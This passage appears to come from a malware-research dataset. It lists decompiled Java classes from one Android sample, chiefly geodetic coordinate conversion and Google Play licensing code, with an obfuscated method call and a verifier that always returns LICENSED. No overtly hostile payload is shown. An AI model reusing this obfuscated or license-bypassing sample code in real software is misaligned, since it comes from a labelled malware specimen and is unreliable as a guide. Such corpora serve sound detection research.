d3) + (radians5 * radians5));     double atan=Math.atan(d4 / ((1.0d - b3) * sqrt2));     for (int i=1; i < 10; i++) {       atan=Math.atan(((Math.sin(atan) * ((d5 / Math.sqrt(1.0d - (k.a(atan) * b3))) * b3)) + d4) / sqrt2);     }     this.e=Math.toDegrees(atan);     this.f=degrees;   }   public double g(){     return this.e;   }   public double h(){     return this.e;   }   public int i(){     double h=h();     int floor=(int)Math.floor(h);     return (h >= 0.0d || h - ((double)floor) == 0.0d) ? floor : floor + 1;   }   public int j(){     double h=h();     double floor=h - ((int)Math.floor(h));     if (h < 0.0d && floor != 0.0d) {       floor=1.0d - floor;     }     return (int)Math.floor(floor * 60.0d);   }   public double k(){     double h=h();     double floor=h - ((int)Math.floor(h));     if (h < 0.0d && floor != 0.0d) {       floor=1.0d - floor;     }     return ((floor * 60.0d) - ((int)Math.floor(floor * 60.0d))) * 60.0d;   }   public double l(){     return this.f;   }   public double m(){     return this.f;   }   public int n(){     double m=m();     int floor=(int)Math.floor(m);     return (m >= 0.0d || m - ((double)floor) == 0.0d) ? floor : floor + 1;   }   public int o(){     double m=m();     double floor=m - ((int)Math.floor(m));     if (m < 0.0d && floor != 0.0d) {       floor=1.0d - floor;     }     return (int)Math.floor(floor * 60.0d);   }   public double p(){     double m=m();     double floor=m - ((int)Math.floor(m));     if (m < 0.0d && floor != 0.0d) {       floor=1.0d - floor;     }     return ((floor * 60.0d) - ((int)Math.floor(floor * 60.0d))) * 60.0d;   }   public double q(){     return this.g;   }   public c r(){     return this.h;   }   public String toString(){     return ""("" + this.e + "", ""+ this.f+ "")"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e37fdab"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\g.code","public class g extends RuntimeException {   private static final long f13a=5699420767622348737L;   public g(){   }   public g(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\h.code","public class h extends c {   private static h j=null;   private h(){     this.f5a=""Ordnance Survey of Great Britain 1936 (OSGB36)"";     this.f6b=a.a();     this.c=446.448d;     this.d=-125.157d;     this.e=542.06d;     this.f=-20.4894d;     this.g=0.1502d;     this.h=0.247d;     this.i=0.8421d;   }   public static h j(){     if (j == null) {       j=new h();     }     return j;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\i.code","public class i extends b {   private double f14a;   private double f15b;   public i(  double d,  double d2){     super(h.j());     a(d);     b(d2);   }   public i(  e eVar){     super(h.j());     a a2=a.a();     double radians=Math.toRadians(49.0d);     double radians2=Math.toRadians(-2.0d);     double d=a2.d();     double e=a2.e();     double b2=a2.b();     double radians3=Math.toRadians(eVar.h());     double radians4=Math.toRadians(eVar.m());     double d2=(d - e) / (d + e);     double pow=d * 0.9996012717d * Math.pow(1.0d - (k.a(radians3) * b2),-0.5d);     double pow2=d * 0.9996012717d * (1.0d - b2)* Math.pow(1.0d - (b2 * k.a(radians3)),-1.5d);     double d3=(pow / pow2) - 1.0d;     double sin=((e * 0.9996012717d) * (((((((1.0d + d2) + ((1.25d * d2) * d2)) + (((1.25d * d2) * d2) * d2)) * (radians3 - radians)) - (((((3.0d * d2) + ((3.0d * d2) * d2)) + (((2.625d * d2) * d2) * d2)) * Math.sin(radians3 - radians)) * Math.cos(radians3 + radians))) + (((((1.875d * d2) * d2) + (((1.875d * d2) * d2) * d2)) * Math.sin(2.0d * (radians3 - radians))) * Math.cos(2.0d * (radians3 + radians)))) - (Math.cos((radians + radians3) * 3.0d) * ((d2 * ((1.4583333333333333d * d2) * d2)) * Math.sin(3.0d * (radians3 - radians)))))) - 100000.0d;     double sin2=(pow / 2.0d) * Math.sin(radians3) * Math.cos(radians3);     double sin3=(pow / 24.0d) * Math.sin(radians3) * Math.pow(Math.cos(radians3),3.0d)* ((5.0d - k.e(radians3)) + (9.0d * d3));     double sin4=(pow / 720.0d) * Math.sin(radians3) * Math.pow(Math.cos(radians3),5.0d)* ((61.0d - (58.0d * k.e(radians3))) + Math.pow(Math.tan(radians3),4.0d));     double cos=Math.cos(radians3) * pow;     double e2=((pow / pow2) - k.e(radians3)) * (pow / 6.0d) * Math.pow(Math.cos(radians3),3.0d);     double e3=((((5.0d - (18.0d * k.e(radians3))) + Math.pow(Math.tan(radians3),4.0d)) + (14.0d * d3)) - (d3 * (k.e(radians3) * 58.0d))) * (pow / 120.0d) * Math.pow(Math.cos(radians3),5.0d);     double pow3=sin + (sin2 * Math.pow(radians4 - radians2,2.0d)) + (Math.pow(radians4 - radians2,4.0d) * sin3)+ (Math.pow(radians4 - radians2,6.0d) * sin4);     a(((radians4 - radians2) * cos) + 400000.0d + (Math.pow(radians4 - radians2,3.0d) * e2)+ (Math.pow(radians4 - radians2,5.0d) * e3));     b(pow3);   }   public i(  String str){     super(h.j());     char charAt=str.charAt(0);     int charAt2=str.charAt(1);     int parseInt=Integer.parseInt(str.substring(2,5)) * 100;     int parseInt2=Integer.parseInt(str.substring(5,8)) * 100;     if (charAt == 'H') {       parseInt2+=1000000;     }  else     if (charAt == 'N') {       parseInt2+=500000;     }  else     if (charAt == 'O') {       parseInt2+=500000;       parseInt+=500000;     }  else     if (charAt == 'T') {       parseInt+=500000;     }     charAt2=charAt2 > 73 ? charAt2 - 1 : charAt2;     double floor=(4.0d - Math.floor((charAt2 - 65) / 5)) * 100000.0d;     a(parseInt + (((charAt2 - 65) % 5) * 100000));     b(parseInt2 + floor);   }   @Override public e a(){     double sin;     double radians=Math.toRadians(49.0d);     double radians2=Math.toRadians(-2.0d);     double d=b().b().d();     double e=b().b().e();     double b2=b().b().b();     double d2=this.f14a;     double d3=this.f15b;     double d4=(d - e) / (d + e);     double d5=((d3 - (-100000.0d)) / (d * 0.9996012717d)) + radians;     do {       sin=e * 0.9996012717d * (((((((1.0d + d4) + ((1.25d * d4) * d4)) + (((1.25d * d4) * d4) * d4)) * (d5 - radians)) - (((((3.0d * d4) + ((3.0d * d4) * d4)) + (((2.625d * d4) * d4) * d4)) * Math.sin(d5 - radians)) * Math.cos(d5 + radians))) + (((((1.875d * d4) * d4) + (((1.875d * d4) * d4) * d4)) * Math.sin(2.0d * (d5 - radians))) * Math.cos(2.0d * (d5 + radians)))) - (((((1.4583333333333333d * d4) * d4) * d4) * Math.sin(3.0d * (d5 - radians))) * Math.cos(3.0d * (d5 + radians))));       d5+=((d3 - (-100000.0d)) - sin) / (d * 0.9996012717d);     }  while ((d3 - (-100000.0d)) - sin >= 0.001d);     double pow=d * 0.9996012717d * Math.pow(1.0d - (k.a(d5) * b2),-0.5d);     double pow2=0.9996012717d * d * (1.0d - b2)* Math.pow(1.0d - (k.a(d5) * b2),-1.5d);     double d6=(pow / pow2) - 1.0d;     double tan=Math.tan(d5) / ((2.0d * pow2) * pow);     double e2=(((5.0d + (3.0d * k.e(d5))) + d6) - (d6 * (9.0d * k.e(d5)))) * (Math.tan(d5) / ((24.0d * pow2) * Math.pow(pow,3.0d)));     double tan2=(Math.tan(d5) / ((720.0d * pow2) * Math.pow(pow,5.0d))) * (61.0d + (90.0d * k.e(d5)) + (45.0d * k.e(d5) * k.e(d5)));     double f=k.f(d5) / pow;     double e3=((pow / pow2) + (2.0d * k.e(d5))) * (k.f(d5) / (((6.0d * pow) * pow) * pow));     double f2=(k.f(d5) / (120.0d * Math.pow(pow,5.0d))) * (5.0d + (28.0d * k.e(d5)) + (24.0d * k.e(d5) * k.e(d5)));     double f3=(k.f(d5) / (Math.pow(pow,7.0d) * 5040.0d)) * (61.0d + (662.0d * k.e(d5)) + (1320.0d * k.e(d5) * k.e(d5))+ (720.0d * k.e(d5) * k.e(d5)* k.e(d5)));     return new e(Math.toDegrees(((d5 - (tan * Math.pow(d2 - 400000.0d,2.0d))) + (e2 * Math.pow(d2 - 400000.0d,4.0d))) - (Math.pow(d2 - 400000.0d,6.0d) * tan2)),Math.toDegrees((((((d2 - 400000.0d) * f) + radians2) - (e3 * Math.pow(d2 - 400000.0d,3.0d))) + (Math.pow(d2 - 400000.0d,5.0d) * f2)) - (f3 * Math.pow(d2 - 400000.0d,7.0d))));   }   public void a(  double d){     if (d < 0.0d || d >= 800000.0d) {       throw new IllegalArgumentException(""Easting ("" + d + "") is invalid. Must be greather than or equal to 0.0 and less than 800000.0."");     }     this.f14a=d;   }   public void b(  double d){     if (d < 0.0d || d >= 1400000.0d) {       throw new IllegalArgumentException(""Northing ("" + d + "") is invalid. Must be greather than or equal to 0.0 and less than 1400000.0."");     }     this.f15b=d;   }   public String c(){     int floor=(int)Math.floor(this.f14a / 100000.0d);     int floor2=(int)Math.floor(this.f15b / 100000.0d);     String str=floor2 < 5 ? floor < 5 ? ""S"" : ""T"" : floor2 < 10 ? floor < 5 ? ""N"" : ""O"" : ""H"";     int i=((4 - (floor2 % 5)) * 5) + 65 + (floor % 5);     if (i >= 73) {       i++;     }     String ch=Character.toString((char)i);     int floor3=(int)Math.floor((this.f14a - (100000 * floor)) / 100.0d);     int floor4=(int)Math.floor((this.f15b - (100000 * floor2)) / 100.0d);     String sb=new StringBuilder().append(floor3).toString();     if (floor3 < 100) {       sb=""0"" + sb;     }     if (floor3 < 10) {       sb=""0"" + sb;     }     String sb2=new StringBuilder().append(floor4).toString();     if (floor4 < 100) {       sb2=""0"" + sb2;     }     if (floor4 < 10) {       sb2=""0"" + sb2;     }     return String.valueOf(str) + ch + sb+ sb2;   }   public double d(){     return this.f14a;   }   public double e(){     return this.f15b;   }   public String toString(){     return ""("" + this.f14a + "", ""+ this.f15b+ "")"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\j.code","public class j extends b {   private double f16a;   private double f17b;   private char c;   private int d;   public j(  double d,  double d2,  char c,  int i){     this(i,c,d,d2);   }   public j(  int i,  char c,  double d,  double d2){     super(l.j());     if (i < 1 || i > 60) {       throw new g(""Longitude zone ("" + i + "") is not defined on the UTM grid."");     }     if (c < 'C' || c > 'X') {       throw new g(""Latitude zone ("" + c + "") is not defined on the UTM grid."");     }     if (d < 0.0d || d > 1000000.0d) {       throw new g(""Easting ("" + d + "") is not defined on the UTM grid."");     }     if (d2 < 0.0d || d2 > 1.0E7d) {       throw new g(""Northing ("" + d2 + "") is not defined on the UTM grid."");     }     this.f16a=d;     this.f17b=d2;     this.c=c;     this.d=i;   }   public static char a(  double d){     if (84.0d >= d && d >= 72.0d) {       return 'X';     }     if (72.0d > d && d >= 64.0d) {       return 'W';     }     if (64.0d > d && d >= 56.0d) {       return 'V';     }     if (56.0d > d && d >= 48.0d) {       return 'U';     }     if (48.0d > d && d >= 40.0d) {       return 'T';     }     if (40.0d > d && d >= 32.0d) {       return 'S';     }     if (32.0d > d && d >= 24.0d) {       return 'R';     }     if (24.0d > d && d >= 16.0d) {       return 'Q';     }     if (16.0d > d && d >= 8.0d) {       return 'P';     }     if (8.0d > d && d >= 0.0d) {       return 'N';     }     if (0.0d > d && d >= -8.0d) {       return 'M';     }     if (-8.0d > d && d >= -16.0d) {       return 'L';     }     if (-16.0d > d && d >= -24.0d) {       return 'K';     }     if (-24.0d > d && d >= -32.0d) {       return 'J';     }     if (-32.0d > d && d >= -40.0d) {       return 'H';     }     if (-40.0d > d && d >= -48.0d) {       return 'G';     }     if (-48.0d > d && d >= -56.0d) {       return 'F';     }     if (-56.0d > d && d >= -64.0d) {       return 'E';     }     if (-64.0d <= d || d < -72.0d) {       return (-72.0d <= d || d < -80.0d) ? 'Z' : 'C';     }     return 'D';   }   @Override public e a(){     double d=b().b().d();     double b2=b().b().b();     double d2=b2 / (1.0d - b2);     double sqrt=(1.0d - Math.sqrt(1.0d - b2)) / (1.0d + Math.sqrt(1.0d - b2));     double d3=this.f16a - 500000.0d;     double d4=this.f17b;     double d5=(((this.d - 1.0d) * 6.0d) - 180.0d) + 3.0d;     if (this.c - 'N' < 0) {       d4-=1.0E7d;     }     double pow=(d4 / 0.9996d) / ((((1.0d - (b2 / 4.0d)) - (((3.0d * b2) * b2) / 64.0d)) - ((5.0d * Math.pow(b2,3.0d)) / 256.0d)) * d);     double sin=(Math.sin(pow * 6.0d) * ((Math.pow(sqrt,3.0d) * 151.0d) / 96.0d)) + ((((3.0d * sqrt) / 2.0d) - ((27.0d * Math.pow(sqrt,3.0d)) / 32.0d)) * Math.sin(2.0d * pow)) + pow+ (((((21.0d * sqrt) * sqrt) / 16.0d) - ((55.0d * Math.pow(sqrt,4.0d)) / 32.0d)) * Math.sin(4.0d * pow));     double sqrt2=d / Math.sqrt(1.0d - ((Math.sin(sin) * b2) * Math.sin(sin)));     double tan=Math.tan(sin) * Math.tan(sin);     double cos=Math.cos(sin) * d2 * Math.cos(sin);     double d6=d3 / (0.9996d * sqrt2);     return new e((sin - (((Math.tan(sin) * sqrt2) / ((d * (1.0d - b2)) / Math.pow(1.0d - ((b2 * Math.sin(sin)) * Math.sin(sin)),1.5d))) * ((((d6 * d6) / 2.0d) - ((((((5.0d + (3.0d * tan)) + (10.0d * cos)) - ((4.0d * cos) * cos)) - (9.0d * d2)) * Math.pow(d6,4.0d)) / 24.0d)) + (((((((61.0d + (90.0d * tan)) + (298.0d * cos)) + ((45.0d * tan) * tan)) - (252.0d * d2)) - ((3.0d * cos) * cos)) * Math.pow(d6,6.0d)) / 720.0d)))) * 57.29577951308232d,(((((Math.pow(d6,5.0d) * (((d2 * 8.0d) + (((5.0d - (2.0d * cos)) + (28.0d * tan)) - ((3.0d * cos) * cos))) + ((24.0d * tan) * tan))) / 120.0d) + (d6 - ((((1.0d + (2.0d * tan)) + cos) * Math.pow(d6,3.0d)) / 6.0d))) / Math.cos(sin)) * 57.29577951308232d) + d5);   }   public double c(){     return this.f16a;   }   public double d(){     return this.f17b;   }   public char e(){     return this.c;   }   public int f(){     return this.d;   }   public String toString(){     return String.valueOf(this.d) + Character.toString(this.c) + "" ""+ this.f16a+ "" ""+ this.f17b;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\k.code","class k {   k(){   }   public static double a(  double d){     return Math.sin(d) * Math.sin(d);   }   protected static double b(  double d){     return a(d) * Math.sin(d);   }   protected static double c(  double d){     return Math.cos(d) * Math.cos(d);   }   protected static double d(  double d){     return c(d) * Math.cos(d);   }   public static double e(  double d){     return Math.tan(d) * Math.tan(d);   }   public static double f(  double d){     return 1.0d / Math.cos(d);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\l.code","public class l extends c {   private static l j=null;   public l(){     this.f5a=""World Geodetic System 1984 (WGS84)"";     this.f6b=m.a();     this.c=0.0d;     this.d=0.0d;     this.e=0.0d;     this.f=1.0d;     this.g=0.0d;     this.h=0.0d;     this.i=0.0d;   }   public static l j(){     if (j == null) {       j=new l();     }     return j;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\m.code","public class m extends d {   private static m e=null;   private m(){     super(6378137.0d,6356752.3142d);   }   public static m a(){     if (e == null) {       e=new m();     }     return e;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\a.code","public class a implements p {   private static final String f18a=""UTF-8"";   private static final String f19b=""PBEWITHSHAAND256BITAES-CBC-BC"";   private static final String c=""AES/CBC/PKCS5Padding"";   private static final byte[] d={16,74,71,-80,32,102,-47,72,117,-14,0,-29,70,65,-12,73};   private static final String e=""com.android.vending.licensing.AESObfuscator-1|"";   private Cipher f;   private Cipher g;   public a(  byte[] bArr,  String str,  String str2){     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(SecretKeyFactory.getInstance(f19b).generateSecret(new PBEKeySpec((String.valueOf(str) + str2).toCharArray(),bArr,1024,256)).getEncoded(),""AES"");       this.f=Cipher.getInstance(c);       this.f.init(1,secretKeySpec,new IvParameterSpec(d));       this.g=Cipher.getInstance(c);       this.g.init(2,secretKeySpec,new IvParameterSpec(d));     }  catch (    GeneralSecurityException e2) {       throw new RuntimeException(""Invalid environment"",e2);     }   }   @Override public String a(  String str){     if (str == null) {       return null;     }     try {       return com.android.vending.licensing.a.a.a(this.f.doFinal((e + str).getBytes(f18a)));     }  catch (    UnsupportedEncodingException e2) {       throw new RuntimeException(""Invalid environment"",e2);     } catch (    GeneralSecurityException e3) {       throw new RuntimeException(""Invalid environment"",e3);     }   }   @Override public String b(  String str){     if (str == null) {       return null;     }     try {       String str2=new String(this.g.doFinal(com.android.vending.licensing.a.a.a(str)),f18a);       if (str2.indexOf(e) != 0) {         throw new w(""Header not found (invalid data or key):"" + str);       }       return str2.substring(e.length(),str2.length());     }  catch (    com.android.vending.licensing.a.b e2) {       throw new w(String.valueOf(e2.getMessage()) + "":"" + str);     } catch (    UnsupportedEncodingException e3) {       throw new RuntimeException(""Invalid environment"",e3);     } catch (    BadPaddingException e4) {       throw new w(String.valueOf(e4.getMessage()) + "":"" + str);     } catch (    IllegalBlockSizeException e5) {       throw new w(String.valueOf(e5.getMessage()) + "":"" + str);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\b.code","public interface b {   r a(  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\c.code","public interface c extends IInterface {   void a(  int i,  String str,  String str2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3d71751b"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\e.code","class e implements c {   private IBinder f25a;   public e(  IBinder iBinder){     this.f25a=iBinder;   }   public String a(){     return ""com.android.vending.licensing.ILicenseResultListener"";   }   @Override public void a(  int i,  String str,  String str2){     Parcel obtain=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.android.vending.licensing.ILicenseResultListener"");       obtain.writeInt(i);       obtain.writeString(str);       obtain.writeString(str2);       this.f25a.transact(1,obtain,null,1);     }   finally {       obtain.recycle();     }   }   @Override public IBinder asBinder(){     return this.f25a;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2774430b"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\g.code","class g implements ILicensingService {   private IBinder f28a;   public g(  IBinder iBinder){     this.f28a=iBinder;   }   public String a(){     return ""com.android.vending.licensing.ILicensingService"";   }   @Override public void a(  long j,  String str,  c cVar){     Parcel obtain=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.android.vending.licensing.ILicensingService"");       obtain.writeLong(j);       obtain.writeString(str);       obtain.writeStrongBinder(cVar != null ? cVar.asBinder() : null);       this.f28a.transact(1,obtain,null,1);     }   finally {       obtain.recycle();     }   }   @Override public IBinder asBinder(){     return this.f28a;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\h.code","public class h implements ServiceConnection {   private static final String f29a=""LicenseChecker"";   private static final String f30b=""RSA"";   private static final int c=10000;   private static final SecureRandom d=new SecureRandom();   private ILicensingService e;   private PublicKey f;   private final Context g;   private final q h;   private Handler i;   private final String j;   private final String k;   private final Set l=new HashSet();   private final Queue m=new LinkedList();   public h(  Context context,  q qVar,  String str){     this.g=context;     this.h=qVar;     this.f=a(str);     this.j=this.g.getPackageName();     this.k=a(context,this.j);     HandlerThread handlerThread=new HandlerThread(""background thread"");     handlerThread.start();     this.i=new Handler(handlerThread.getLooper());   }   private static String a(  Context context,  String str){     try {       return String.valueOf(zPmNuMYJ.xcTEJeJ2OrFy(context.getPackageManager(),str,0).versionCode);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(f29a,""Package not found. could not get version code."");       return """";     }   }   private static PublicKey a(  String str){     try {       return KeyFactory.getInstance(f30b).generatePublic(new X509EncodedKeySpec(com.android.vending.licensing.a.a.a(str)));     }  catch (    com.android.vending.licensing.a.b e) {       Log.e(f29a,""Could not decode from Base64."");       throw new IllegalArgumentException(e);     } catch (    NoSuchAlgorithmException e2) {       throw new RuntimeException(e2);     } catch (    InvalidKeySpecException e3) {       Log.e(f29a,""Invalid key specification."");       throw new IllegalArgumentException(e3);     }   }   public synchronized void a(  n nVar){     this.l.remove(nVar);     if (this.l.isEmpty()) {       c();     }   }   private void b(){     while (true) {       n nVar=(n)this.m.poll();       if (nVar == null) {         return;       }       try {         Log.i(f29a,""Calling checkLicense on service for "" + nVar.c());         this.e.a(nVar.b(),nVar.c(),new i(this,nVar));         this.l.add(nVar);       }  catch (      RemoteException e) {         Log.w(f29a,""RemoteException in checkLicense call."",e);         b(nVar);       }     }   }   public synchronized void b(  n nVar){     this.h.a(r.RETRY,null);     if (this.h.a()) {       nVar.a().a();     }  else {       nVar.a().b();     }   }   private void c(){     if (this.e != null) {       try {         this.g.unbindService(this);       }  catch (      IllegalArgumentException e) {         Log.e(f29a,""Unable to unbind from licensing service (already unbound)"");       }       this.e=null;     }   }   private int d(){     return d.nextInt();   }   public synchronized void a(){     c();     this.i.getLooper().quit();   }   public synchronized void a(  l lVar){     if (this.h.a()) {       Log.i(f29a,""Using cached license response.."");       lVar.a();     }  else {       n nVar=new n(this.h,new o(),lVar,d(),this.j,this.k);       if (this.e == null) {         Log.i(f29a,""Binding to licensing service.."");         try {           if (this.g.bindService(new Intent(ILicensingService.class.getName()),this,1)) {             this.m.offer(nVar);           }  else {             Log.e(f29a,""Could not bind to service.."");             b(nVar);           }         }  catch (        SecurityException e) {           lVar.a(m.MISSING_PERMISSION);         }       }  else {         this.m.offer(nVar);         b();       }     }   }   @Override public synchronized void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     this.e=f.a(iBinder);     b();   }   @Override public synchronized void onServiceDisconnected(  ComponentName componentName){     Log.w(f29a,""Service unexpectedly disconnected."");     this.e=null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\i.code","public class i extends d {   final h f31b;   private final n c;   private Runnable d=new j(this);   public i(  h hVar,  n nVar){     this.f31b=hVar;     this.c=nVar;     a();   }   private void a(){     Handler handler;     Log.i(""LicenseChecker"",""Start monitoring timeout."");     handler=this.f31b.i;     handler.postDelayed(this.d,10000L);   }   public void b(){     Handler handler;     Log.i(""LicenseChecker"",""Clearing timeout."");     handler=this.f31b.i;     handler.removeCallbacks(this.d);   }   @Override public void a(  int i,  String str,  String str2){     Handler handler;     handler=this.f31b.i;     handler.post(new k(this,i,str,str2));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\ILicensingService.code","public interface ILicensingService extends IInterface {   void a(  long j,  String str,  c cVar); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\j.code","public class j implements Runnable {   final i f32a;   public j(  i iVar){     this.f32a=iVar;   }   @Override public void run(){     h hVar;     n nVar;     h hVar2;     n nVar2;     Log.i(""LicenseChecker"",""Check timed out."");     hVar=this.f32a.f31b;     nVar=this.f32a.c;     hVar.b(nVar);     hVar2=this.f32a.f31b;     nVar2=this.f32a.c;     hVar2.a(nVar2);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\k.code","class k implements Runnable {   final i f33a;   private final int f34b;   private final String c;   private final String d;   public k(  i iVar,  int i,  String str,  String str2){     this.f33a=iVar;     this.f34b=i;     this.c=str;     this.d=str2;   }   @Override public void run(){     h hVar;     Set set;     n nVar;     n nVar2;     h hVar2;     PublicKey publicKey;     h hVar3;     n nVar3;     Log.i(""LicenseChecker"",""Received response."");     hVar=this.f33a.f31b;     set=hVar.l;     nVar=this.f33a.c;     if (set.contains(nVar)) {       this.f33a.b();       nVar2=this.f33a.c;       hVar2=this.f33a.f31b;       publicKey=hVar2.f;       nVar2.a(publicKey,this.f34b,this.c,this.d);       hVar3=this.f33a.f31b;       nVar3=this.f33a.c;       hVar3.a(nVar3);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\l.code","public interface l {   void a();   void a(  m mVar);   void b(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\n.code","!org.eclipse.jdt.core.dom.TypeDeclaration@10ed5f91"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\o.code","public class o implements b {   @Override public r a(  String str){     return r.LICENSED;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\p.code","public interface p {   String a(  String str);   String b(  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\q.code","public interface q {   void a(  r rVar,  t tVar);   boolean a(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\s.code","public class s {   private static final String f41a=""PreferenceObfuscator"";   private final SharedPreferences f42b;   private final p c;   private SharedPreferences.Editor d=null;   public s(  SharedPreferences sharedPreferences,  p pVar){     this.f42b=sharedPreferences;     this.c=pVar;   }   public void a(){     if (this.d != null) {       this.d.commit();       this.d=null;     }   }   public void a(  String str,  String str2){     if (this.d == null) {       this.d=this.f42b.edit();     }     this.d.putString(str,this.c.a(str2));   }   public String b(  String str,  String str2){     String string=this.f42b.getString(str,null);     if (string == null) {       return str2;     }     try {       return this.c.b(string);     }  catch (    w e) {       Log.w(f41a,""Validation error while reading preference: "" + str);       return str2;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\t.code","class t {   public int f43a;   public int f44b;   public String c;   public String d;   public String e;   public long f;   public String g;   t(){   }   public static t a(  String str){     TextUtils.SimpleStringSplitter simpleStringSplitter=new TextUtils.SimpleStringSplitter(':');     simpleStringSplitter.setString(str);     Iterator it=simpleStringSplitter.iterator();     if (!it.hasNext()) {       throw new IllegalArgumentException(""Blank response."");     }     String str2=(String)it.next();     String str3=it.hasNext() ? (String)it.next() : """";     String[] split=TextUtils.split(str2,Pattern.quote(""|""));     if (split.length < 6) {       throw new IllegalArgumentException(""Wrong number of fields."");     }     t tVar=new t();     tVar.g=str3;     tVar.f43a=Integer.parseInt(split[0]);     tVar.f44b=Integer.parseInt(split[1]);     tVar.c=split[2];     tVar.d=split[3];     tVar.e=split[4];     tVar.f=Long.parseLong(split[5]);     return tVar;   }   public String toString(){     return TextUtils.join(""|"",new Object[]{Integer.valueOf(this.f43a),Integer.valueOf(this.f44b),this.c,this.d,this.e,Long.valueOf(this.f)});   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\u.code","public class u implements q {   private static final String f45a=""ServerManagedPolicy"";   private static final String f46b=""com.android.vending.licensing.ServerManagedPolicy"";   private static final String c=""lastResponse"";   private static final String d=""validityTimestamp"";   private static final String e=""retryUntil"";   private static final String f=""maxRetries"";   private static final String g=""retryCount"";   private static final String h=""0"";   private static final String i=""0"";   private static final String j=""0"";   private static final String k=""0"";   private static final long l=60000;   private long m;   private long n;   private long o;   private long p;   private long q=0;   private r r;   private s s;   public u(  Context context,  p pVar){     this.s=new s(context.getSharedPreferences(f46b,0),pVar);     this.r=r.valueOf(this.s.b(c,r.RETRY.toString()));     this.m=Long.parseLong(this.s.b(d,""0""));     this.n=Long.parseLong(this.s.b(e,""0""));     this.o=Long.parseLong(this.s.b(f,""0""));     this.p=Long.parseLong(this.s.b(g,""0""));   }   private void a(  long j2){     this.p=j2;     this.s.a(g,Long.toString(j2));   }   private void a(  r rVar){     this.q=System.currentTimeMillis();     this.r=rVar;     this.s.a(c,rVar.toString());   }   private void a(  String str){     Long valueOf;     try {       valueOf=Long.valueOf(Long.parseLong(str));     }  catch (    NumberFormatException e2) {       Log.w(f45a,""License validity timestamp (VT) missing, caching for a minute"");       valueOf=Long.valueOf(System.currentTimeMillis() + l);       str=Long.toString(valueOf.longValue());     }     this.m=valueOf.longValue();     this.s.a(d,str);   }   private void b(  String str){     Long l2;     try {       